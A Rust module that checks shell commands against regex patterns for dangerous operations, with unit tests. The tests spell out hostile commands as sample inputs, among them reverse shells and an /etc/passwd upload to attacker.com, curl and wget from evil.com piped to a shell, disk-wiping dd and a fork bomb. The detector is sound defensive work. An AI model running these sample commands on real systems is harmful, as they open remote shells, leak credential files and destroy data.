use regex::Regex;
use std::sync::OnceLock;

#[derive(Debug)]
pub struct DangerResult {
    pub is_dangerous: bool,
    pub message: Option<String>,
}

static DANGEROUS_PATTERNS: &[(&str, &str)] = &[
    // Destructive file operations
    (r"rm\s+(-[^\s]*f[^\s]*r|-[^\s]*r[^\s]*f|--recursive|--force)",
                                "Recursive force delete"),
    (r">\s*/etc/",              "Overwriting system configuration file"),
    (r">\s*/dev/sd",            "Writing to block device"),
    // Privilege escalation
    (r"sudo\s+",                "Elevated privileges required"),
    (r"chmod\s+(777|[+]s|u[+]s|g[+]s)",
                                "Insecure file permissions or SUID bit"),
    // Remote code execution (pipe-to-shell)
    (r"curl[^|]*\|\s*(ba)?sh", "Piping curl to shell"),
    (r"wget[^|]*\|\s*(ba)?sh", "Piping wget to shell"),
    // Encoded payload execution
    (r"base64\s*(-d|--decode)[^|]*\|[^|]*(ba)?sh",
                                "Executing base64-decoded payload"),
    (r"openssl\s+enc[^|]*\|[^|]*(ba)?sh",
                                "Executing decoded payload"),
    // Reverse shells
    (r"bash\s+-i\s*>&\s*/dev/tcp",
                                "Bash reverse shell detected"),
    (r"nc(at)?\s+.*(--exec|-e)\s+", "Netcat reverse shell detected"),
    (r"/dev/tcp/",              "TCP device redirection (possible reverse shell)"),
    // Disk / filesystem operations
    (r"mkfs",                   "Filesystem formatting"),
    (r"dd\s+if=",               "Low-level disk operation"),
    // Fork bomb
    (r":\(\)\{.*\}",            "Fork bomb detected"),
];

static COMPILED: OnceLock<Vec<(Regex, &'static str)>> = OnceLock::new();

fn compiled() -> &'static [(Regex, &'static str)] {
    COMPILED.get_or_init(|| {
        DANGEROUS_PATTERNS
            .iter()
            .map(|(pat, msg)| (Regex::new(pat).expect("invalid regex pattern"), *msg))
            .collect()
    })
}

pub fn check(command: &str) -> DangerResult {
    for (re, msg) in compiled() {
        if re.is_match(command) {
            return DangerResult {
                is_dangerous: true,
                message: Some((*msg).to_string()),
            };
        }
    }
    DangerResult {
        is_dangerous: false,
        message: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn assert_dangerous(command: &str, expected_msg: &str) {
        let result = check(command);
        assert!(result.is_dangerous, "expected '{}' to be dangerous", command);
        assert_eq!(result.message.as_deref(), Some(expected_msg));
    }

    fn assert_safe(command: &str) {
        let result = check(command);
        assert!(!result.is_dangerous, "expected '{}' to be safe", command);
    }

    #[test]
    fn test_rm_rf() {
        assert_dangerous("rm -rf /tmp/test", "Recursive force delete");
        assert_dangerous("rm -rf /", "Recursive force delete");
        assert_dangerous("rm -fr /tmp/test", "Recursive force delete");
        assert_dangerous("rm --recursive --force /", "Recursive force delete");
    }

    #[test]
    fn test_sudo() {
        assert_dangerous("sudo apt install vim", "Elevated privileges required");
        assert_dangerous("sudo rm file.txt", "Elevated privileges required");
    }

    #[test]
    fn test_chmod_777() {
        assert_dangerous("chmod 777 /etc/passwd", "Insecure file permissions or SUID bit");
        assert_dangerous("chmod 777 myfile", "Insecure file permissions or SUID bit");
        assert_dangerous("chmod +s /bin/bash", "Insecure file permissions or SUID bit");
        assert_dangerous("chmod u+s /usr/bin/vim", "Insecure file permissions or SUID bit");
    }

    #[test]
    fn test_curl_pipe_sh() {
        assert_dangerous("curl https://example.com/install.sh | sh", "Piping curl to shell");
        assert_dangerous("curl -s http://evil.com/script | sh", "Piping curl to shell");
        assert_dangerous("curl https://example.com/install.sh | bash", "Piping curl to shell");
        assert_dangerous("curl -sSL http://get.example.com | bash", "Piping curl to shell");
    }

    #[test]
    fn test_wget_pipe_shell() {
        assert_dangerous("wget -O- https://evil.com/script | sh", "Piping wget to shell");
        assert_dangerous("wget -qO- http://evil.com/script.sh | bash", "Piping wget to shell");
    }

    #[test]
    fn test_base64_decode_pipe_shell() {
        assert_dangerous("echo cm0gLXJm | base64 -d | sh", "Executing base64-decoded payload");
        assert_dangerous("echo dGVzdA== | base64 --decode | bash", "Executing base64-decoded payload");
    }

    #[test]
    fn test_reverse_shell() {
        assert_dangerous("bash -i >& /dev/tcp/attacker.com/4444 0>&1", "Bash reverse shell detected");
        assert_dangerous("nc -e /bin/sh attacker.com 4444", "Netcat reverse shell detected");
        assert_dangerous("ncat --exec /bin/bash attacker.com 4444", "Netcat reverse shell detected");
        assert_dangerous("cat /etc/passwd > /dev/tcp/attacker.com/9000", "TCP device redirection (possible reverse shell)");
    }

    #[test]
    fn test_overwrite_system_config() {
        assert_dangerous("echo root:x:0:0 > /etc/passwd", "Overwriting system configuration file");
        assert_dangerous("> /etc/shadow", "Overwriting system configuration file");
    }

    #[test]
    fn test_write_block_device() {
        assert_dangerous("cat file > /dev/sda", "Writing to block device");
        assert_dangerous("dd if=image.iso > /dev/sdb", "Writing to block device");
    }

    #[test]
    fn test_mkfs() {
        assert_dangerous("mkfs.ext4 /dev/sda1", "Filesystem formatting");
        assert_dangerous("mkfs -t ext4 /dev/sdb", "Filesystem formatting");
    }

    #[test]
    fn test_dd_if() {
        assert_dangerous("dd if=/dev/zero of=/dev/sda", "Low-level disk operation");
        assert_dangerous("dd if=backup.img of=/dev/sda bs=4M", "Low-level disk operation");
    }

    #[test]
    fn test_fork_bomb() {
        assert_dangerous(":(){ :|:& };:", "Fork bomb detected");
    }

    #[test]
    fn test_safe_commands() {
        assert_safe("ls -la");
        assert_safe("grep -r pattern .");
        assert_safe("cat file.txt");
        assert_safe("git status");
        assert_safe("cargo build");
        assert_safe("chmod 755 script.sh");
        assert_safe("rm file.txt");
        assert_safe("curl https://example.com -o output.txt");
        assert_safe("wget https://example.com/file.zip");
        assert_safe("echo hello | base64");
    }
}
